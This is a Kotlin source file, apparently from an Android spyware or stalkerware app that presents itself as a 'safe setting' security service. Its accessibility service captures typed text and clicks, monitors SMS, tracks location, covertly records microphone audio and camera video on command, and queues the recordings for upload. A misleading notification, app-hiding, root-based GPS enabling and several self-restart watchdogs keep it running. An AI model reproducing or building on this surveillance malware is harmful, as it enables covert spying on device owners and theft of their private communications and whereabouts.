package com.safe.setting.app.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.SystemClock
import android.provider.Telephony
import android.text.TextUtils
import android.util.Log
import android.view.Surface
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.safe.setting.app.R
import dagger.hilt.android.AndroidEntryPoint
import com.safe.setting.app.receiver.RestartServiceReceiver
import com.safe.setting.app.services.health.HealthCheckService
import com.safe.setting.app.services.sms.SmsObserver
import com.safe.setting.app.services.sms.SmsService
import com.safe.setting.app.services.watchdog.WatchdogJobService
import com.safe.setting.app.utils.ConstFun
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.ConstFun.enableGpsRoot
import com.safe.setting.app.utils.ConstFun.isRoot
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.FileHelper
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.workers.UploadWorker
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import androidx.work.Constraints
import androidx.work.NetworkType

interface RecordingController {
    fun startVideoRecording(facing: Int)
    fun startAudioRecording()
}

@SuppressLint("AccessibilityPolicy")
@AndroidEntryPoint
class AccessibilityDataService : AccessibilityService(), LocationListener, RecordingController {

    companion object {
        var isRunningService: Boolean = false
            private set
        const val NOTIFICATION_CHANNEL_ID = "AccessibilityServiceChannel"
        const val NOTIFICATION_ID = 2
        const val RECORDING_DURATION = 30000L // 30 सेकंड
        const val PRIMING_VIDEO_RECORDING_DURATION = 5000L
        const val HEARTBEAT_INTERVAL = 2 * 60 * 1000L // 2 मिनट
    }

    @Inject
    lateinit var interactor: InteractorAccessibilityData

    private lateinit var locationManager: LocationManager
    private var smsObserver: SmsObserver? = null
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private lateinit var heartbeatRunnable: Runnable
    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private lateinit var randomName: String
    @Volatile
    private var isRecording = false
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private lateinit var cameraManager: CameraManager
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var isPrimingCommandExecuted = false

    override fun onCreate() {
        super.onCreate()
        try {
            Log.i(TAG, "AccessibilityDataService is being created.")
            interactor.setRecordingController(this)
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            scheduleRestartAlarm()
            scheduleWatchdogJob()
        } catch (e: Exception) {
            Log.e(TAG, "Service Dagger injection failed: ${e.message}")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isRunningService = true
        Log.i(TAG, "Accessibility service connected successfully.")

        startForeground(NOTIFICATION_ID, createNotification("System service is running for your security."))
        startHeartbeat()

        interactor.triggerAutomaticVideoPrimingCommand()

        val healthIntent = Intent(this, HealthCheckService::class.java)
        startService(healthIntent)

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                Log.i(TAG, "Starting delayed initialization.")
                initializeServices()
                interactor.setRunServiceData(true)
                startSmsService()
            } catch (e: Exception) {
                Log.e(TAG, "Error in delayed onServiceConnected initialization: ${e.message}")
            }
        }, 500)
    }

    private fun startHeartbeat() {
        heartbeatRunnable = Runnable {
            Log.d(TAG, "Heartbeat: Service is active.")
            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL)
        }
        heartbeatHandler.post(heartbeatRunnable)
    }

    private fun stopHeartbeat() {
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
    }

    private fun createNotification(contentText: String): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Device Security",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }

        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(contentText)
            .setSmallIcon(R.mipmap.c_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(contentText: String) {
        val notification = createNotification(contentText)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunningService = false
        stopHeartbeat()
        val healthIntent = Intent(this, HealthCheckService::class.java)
        stopService(healthIntent)
        try {
            interactor.setRunServiceData(false)
            interactor.clearDisposable()
            locationManager.removeUpdates(this)
            unregisterSmsObserver()
            Log.i(TAG, "AccessibilityDataService destroyed successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Error during service destruction: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    override fun startAudioRecording() {
        if (isRecording) {
            Log.w(TAG, "पहले से ही रिकॉर्डिंग चल रही है, नए ऑडियो अनुरोध को अनदेखा किया जा रहा है।")
            return
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            interactor.reportCommandStatus("AUDIO", "FAILED", "Record audio permission not granted.")
            Log.e(TAG, "ऑडियो रिकॉर्डिंग की अनुमति नहीं है।")
            return
        }

        isRecording = true
        randomName = ConstFun.getRandomNumeric()
        val filePath = FileHelper.getMediaFilePath(this)
        recordingFile = File(filePath, "$randomName.mp3")

        interactor.setPushState(Consts.STATE_RECORDING, randomName, Consts.AUDIO)
        updateNotification("Recording audio...")

        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()

        mediaRecorder?.apply {
            try {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(recordingFile!!.absolutePath)
                prepare()
                start()
                Log.d(TAG, "ऑडियो रिकॉर्डिंग शुरू हुई।")

                Handler(Looper.getMainLooper()).postDelayed({
                    stopRecordingAndCleanup(isAudioOnly = true)
                }, RECORDING_DURATION)

            } catch (e: Exception) {
                Log.e(TAG, "MediaRecorder तैयार करने में विफल: ${e.message}")
                interactor.setPushState("${Consts.STATE_FAILED}: ${e.message}", randomName, Consts.AUDIO)
                interactor.reportCommandStatus("AUDIO", "FAILED", "MediaRecorder prepare failed: ${e.message}")
                isRecording = false
                updateNotification("System service is running for your security.")
            }
        }
    }

    override fun startVideoRecording(facing: Int) {
        if (isRecording) {
            Log.w(TAG, "पहले से ही रिकॉर्डिंग चल रही है, नए वीडियो अनुरोध को अनदेखा किया जा रहा है।")
            return
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            interactor.reportCommandStatus("VIDEO", "FAILED", "Camera permission not granted.")
            Log.e(TAG, "कैमरा की अनुमति नहीं है।")
            return
        }

        isRecording = true
        startCameraThread()
        randomName = ConstFun.getRandomNumeric()
        val filePath = FileHelper.getMediaFilePath(this)
        recordingFile = File(filePath, "$randomName.mp4")
        interactor.setPushState(Consts.STATE_RECORDING, randomName, Consts.VIDEO)
        updateNotification("Recording video...")
        setupMediaRecorderForVideo()
        openCamera(facing)
    }

    private fun stopRecordingAndCleanup(isAudioOnly: Boolean) {
        if (!isRecording) return

        Log.d(TAG, "रिकॉर्डिंग रोकने और संसाधनों को साफ करने की प्रक्रिया शुरू। ऑडियो केवल: $isAudioOnly")

        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            Log.d(TAG, "MediaRecorder रोका और मुक्त किया गया।")
        } catch (e: Exception) {
            Log.e(TAG, "MediaRecorder को रोकने में त्रुटि (संभाल लिया गया): ${e.message}")
        } finally {
            mediaRecorder = null
        }

        if (!isAudioOnly) {
            try {
                captureSession?.close()
                Log.d(TAG, "CameraCaptureSession बंद किया गया।")
            } catch (e: Exception) {
                Log.e(TAG, "CameraCaptureSession को बंद करने में त्रुटि (संभाल लिया गया): ${e.message}")
            } finally {
                captureSession = null
            }

            try {
                cameraDevice?.close()
                Log.d(TAG, "CameraDevice बंद किया गया।")
            } catch (e: Exception) {
                Log.e(TAG, "CameraDevice को बंद करने में त्रुटि (संभाल लिया गया): ${e.message}")
            } finally {
                cameraDevice = null
            }

            stopCameraThread()
        }

        val fileType = if (isAudioOnly) "AUDIO" else "VIDEO"
        scheduleUpload(fileType)

        isRecording = false
        updateNotification("System service is running for your security.")
        Log.d(TAG, "सभी रिकॉर्डिंग संसाधन सफलतापूर्वक साफ कर दिए गए हैं।")
    }

    private fun scheduleUpload(fileType: String) {
        recordingFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                interactor.setPushState(Consts.STATE_UPLOADING, randomName, fileType)
                interactor.reportCommandStatus(fileType, "UPLOAD_STARTED", "File recorded. Starting upload.")

                // --- YAHAN PAR SABSE ZAROORI BADLAV HAI ---

                // Niyam banayein ki network juda hona chahiye
                val constraints = Constraints.Builder()
                    // Is line ko badla gaya hai
                    .setRequiredNetworkType(NetworkType.CONNECTED) // Kaam tabhi chalega jab Wi-Fi YA Mobile Data chalu ho
                    .build()

                // Baaki sab waisa hi hai
                val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
                    .setInputData(workDataOf(
                        "FILE_PATH" to file.absolutePath,
                        "FILE_TYPE" to fileType,
                        "RANDOM_NAME" to randomName
                    ))
                    .setConstraints(constraints)
                    .build()

                WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
            } else {
                interactor.setPushState("${Consts.STATE_FAILED}: Empty file", randomName, fileType)
                interactor.reportCommandStatus(fileType, "FAILED", "Recording resulted in an empty file.")
            }
        }
    }


//    private fun scheduleUpload(fileType: String) {
//        recordingFile?.let { file ->
//            if (file.exists() && file.length() > 0) {
//                interactor.setPushState(Consts.STATE_UPLOADING, randomName, fileType)
//                interactor.reportCommandStatus(fileType, "UPLOAD_STARTED", "File recorded. Starting upload.")
//                val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
//                    .setInputData(workDataOf(
//                        "FILE_PATH" to file.absolutePath,
//                        "FILE_TYPE" to fileType,
//                        "RANDOM_NAME" to randomName
//                    ))
//                    .build()
//                WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
//            } else {
//                interactor.setPushState("${Consts.STATE_FAILED}: Empty file", randomName, fileType)
//                interactor.reportCommandStatus(fileType, "FAILED", "Recording resulted in an empty file.")
//            }
//        }
//    }

    @SuppressLint("MissingPermission")
    private fun openCamera(facing: Int) {
        try {
            val cameraId = if (facing == CameraFacing.FRONT_FACING_CAMERA) "1" else "0"
            Log.d(TAG, "कैमरा खोलने का प्रयास: ID $cameraId (0=बैक, 1=फ्रंट)")
            cameraHandler?.let {
                cameraManager.openCamera(cameraId, stateCallback, it)
            } ?: run {
                Log.e(TAG, "कैमरा हैंडलर शुरू नहीं हुआ है। कैमरा नहीं खोल सकते।")
                isRecording = false
                updateNotification("System service is running for your security.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "कैमरा खोलने में विफल: ${e.message}")
            interactor.reportCommandStatus("VIDEO", "FAILED", "OS failed to open camera: ${e.message}")
            isRecording = false
            updateNotification("System service is running for your security.")
        }
    }

    private val stateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            startCaptureSession()
        }
        override fun onDisconnected(camera: CameraDevice) {
            camera.close()
            cameraDevice = null
            isRecording = false
            stopCameraThread()
        }
        override fun onError(camera: CameraDevice, error: Int) {
            Log.e(TAG, "कैमरा त्रुटि: $error")
            interactor.reportCommandStatus("VIDEO", "FAILED", "CameraDevice.StateCallback onError: $error")
            camera.close()
            cameraDevice = null
            isRecording = false
            stopCameraThread()
            updateNotification("System service is running for your security.")
        }
    }

    @Suppress("DEPRECATION")
    private fun startCaptureSession() {
        try {
            val surfaces = ArrayList<Surface>()
            val recorderSurface = mediaRecorder!!.surface
            surfaces.add(recorderSurface)

            cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        val builder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                        builder.addTarget(recorderSurface)
                        session.setRepeatingRequest(builder.build(), null, cameraHandler)
                        mediaRecorder?.start()
                        Log.d(TAG, "वीडियो रिकॉर्डिंग शुरू हुई।")

                        val duration = if (!isPrimingCommandExecuted) {
                            isPrimingCommandExecuted = true
                            PRIMING_VIDEO_RECORDING_DURATION
                        } else {
                            RECORDING_DURATION
                        }

                        Log.d(TAG, "वीडियो रिकॉर्डिंग की अवधि: ${duration / 1000} सेकंड")

                        Handler(Looper.getMainLooper()).postDelayed({
                            stopRecordingAndCleanup(isAudioOnly = false)
                        }, duration)

                    } catch (e: Exception) {
                        Log.e(TAG, "कैप्चर सत्र में त्रुटि: ${e.message}")
                        isRecording = false
                    }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(TAG, "कैप्चर सत्र कॉन्फ़िगर करने में विफल।")
                    interactor.reportCommandStatus("VIDEO", "FAILED", "CameraCaptureSession onConfigureFailed.")
                    isRecording = false
                    updateNotification("System service is running for your security.")
                }
            }, cameraHandler)
        } catch (e: Exception) {
            Log.e(TAG, "कैप्चर सत्र शुरू करने में विफल: ${e.message}")
            isRecording = false
        }
    }

    @Suppress("DEPRECATION")
    private fun setupMediaRecorderForVideo() {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()
        mediaRecorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(recordingFile!!.absolutePath)
            setVideoEncodingBitRate(10000000)
            setVideoFrameRate(30)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            try {
                prepare()
            } catch (e: Exception) {
                Log.e(TAG, "MediaRecorder prepare failed: ${e.message}")
                isRecording = false
            }
        }
    }

    private fun startCameraThread() {
        stopCameraThread()
        cameraThread = HandlerThread("CameraBackgroundThread").also { it.start() }
        cameraHandler = Handler(cameraThread!!.looper)
    }

    private fun stopCameraThread() {
        try {
            cameraThread?.quitSafely()
            cameraThread?.join(500)
        } catch (e: InterruptedException) {
            Log.e(TAG, "कैमरा थ्रेड को रोकने में बाधा आई: ${e.message}")
        } finally {
            cameraThread = null
            cameraHandler = null
        }
    }

    private fun initializeServices() {
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
        interactor.getCaptureVideo()
        interactor.getCaptureAudio()
        registerSmsObserver()
    }

    private fun startSmsService() {
        val serviceIntent = Intent(this, SmsService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "SmsService started from AccessibilityDataService.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start SmsService: ${e.message}")
        }
    }

    @SuppressLint("SwitchIntDef")
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            val eventTypeString = when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT"
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUSED"
                AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICKED"
                else -> null
            }

            eventTypeString?.let { type ->
                val textData = getEventText(event)
                if (textData.isNotEmpty()) {
                    val formattedData = "${getDateTime()} |($type)| $textData"
                    interactor.setDataKey(formattedData)
                    Log.i(TAG, formattedData)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}")
        }
    }

    private fun getEventText(event: AccessibilityEvent): String {
        val parentNodeInfo: AccessibilityNodeInfo? = event.source
        if (parentNodeInfo == null) {
            val eventText = event.text.toString()
            return if (eventText != "[]") eventText else ""
        }
        val text = findTextInNode(parentNodeInfo)
        return text.trim()
    }

    private fun findTextInNode(nodeInfo: AccessibilityNodeInfo?): String {
        if (nodeInfo == null) return ""
        val builder = StringBuilder()
        if (!TextUtils.isEmpty(nodeInfo.text)) {
            builder.append(nodeInfo.text.toString()).append(" ")
        }
        for (i in 0 until nodeInfo.childCount) {
            val childNode = nodeInfo.getChild(i)
            if (childNode != null) {
                builder.append(findTextInNode(childNode))
            }
        }
        return builder.toString()
    }

    private fun getDateTime(): String {
        return try {
            SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
        } catch (e: Exception) { "Unknown-Time" }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted.")
    }

    private fun registerSmsObserver() {
        try {
            if (smsObserver == null) {
                smsObserver = SmsObserver(this, Handler(Looper.getMainLooper()))
                contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)
                Log.i(TAG, "SMS observer registered.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS observer: ${e.message}")
        }
    }

    private fun unregisterSmsObserver() {
        try {
            smsObserver?.let {
                contentResolver.unregisterContentObserver(it)
                smsObserver = null
                Log.i(TAG, "SMS observer unregistered.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering SMS observer: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun getLocation() {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                interactor.enablePermissionLocation(true)
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 0f, this)
                Log.i(TAG, "Location updates requested.")
            } else {
                interactor.enablePermissionLocation(false)
                Log.w(TAG, "Location permission not granted.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing location: ${e.message}")
            interactor.enablePermissionLocation(false)
        }
    }

    override fun onLocationChanged(location: Location) {
        interactor.setDataLocation(location)
    }

    override fun onProviderEnabled(provider: String) {
        if (provider == LocationManager.GPS_PROVIDER) {
            interactor.enableGps(true)
        }
    }

    override fun onProviderDisabled(provider: String) {
        if (provider == LocationManager.GPS_PROVIDER) {
            interactor.enableGps(false)
            Handler(Looper.getMainLooper()).postDelayed({
                if (isRoot()) enableGpsRoot()
            }, 3000)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.e(TAG, "TASK REMOVED, RESTARTING SERVICE...")
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)

        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    private fun scheduleRestartAlarm() {
        val restartServiceIntent = Intent(applicationContext, RestartServiceReceiver::class.java)
        val restartServicePendingIntent = PendingIntent.getBroadcast(
            applicationContext, 100, restartServiceIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 1000,
            AlarmManager.INTERVAL_FIFTEEN_MINUTES,
            restartServicePendingIntent
        )
        Log.i(TAG, "AlarmManager Watchdog scheduled.")
    }

    private fun scheduleWatchdogJob() {
        val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        val componentName = ComponentName(this, WatchdogJobService::class.java)
        val jobInfo = JobInfo.Builder(123, componentName)
            .setPeriodic(15 * 60 * 1000)
            .setPersisted(true)
            .build()

        if (jobScheduler.schedule(jobInfo) == JobScheduler.RESULT_SUCCESS) {
            Log.i(TAG, "JobScheduler Watchdog scheduled successfully.")
        } else {
            Log.e(TAG, "Failed to schedule JobScheduler Watchdog.")
        }
    }
}
